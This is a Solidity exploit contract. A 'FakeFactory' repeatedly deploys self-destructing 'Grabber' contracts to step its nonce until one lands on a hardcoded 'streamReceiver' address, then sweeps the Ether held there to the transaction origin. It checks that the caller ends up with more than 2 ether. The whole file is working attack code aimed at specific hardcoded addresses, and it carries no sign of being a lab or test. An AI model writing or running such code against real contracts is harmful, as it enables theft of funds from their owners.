// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

// import Clones from OpenZeppelin
import "@openzeppelin/contracts/proxy/Clones.sol";
// import Address
import "@openzeppelin/contracts/utils/Address.sol";

// import Ownable
import "@openzeppelin/contracts/access/Ownable.sol";

import "hardhat/console.sol";

import "../Factory.sol";

contract Grabber {
    constructor () {
        selfdestruct(payable(tx.origin));
    }

}

contract FakeFactory is Ownable {
    address public immutable streamReceiver =
        0x98CDE40f98E7c77507820C0caEf055CC3cc3fA79;
    address public immutable streamFactory =
        0x1C4663902A55A8346B5bD1131d7405A3513944fD;

    constructor() {}

    function skipNonces(uint amount) public onlyOwner {
        for (uint i = 0; i < amount; i++) {
            Grabber skipper = new Grabber();
            console.log("FakeFactory: deployed", i, address(skipper));

            if (address(skipper) == streamReceiver) {
                console.log("FakeFactory: skipper is streamReceiver");

                // check balance of 0x98CDE40f98E7c77507820C0caEf055CC3cc3fA79
                require(
                    address(streamReceiver).balance == 0,
                    "FakeFactory: failed withdraw"
                );

                require(
                    address(msg.sender).balance > 2 ether,
                    "FakeFactory: failed withdraw"
                );

                selfdestruct(payable(msg.sender));
            }
        }

    }

}
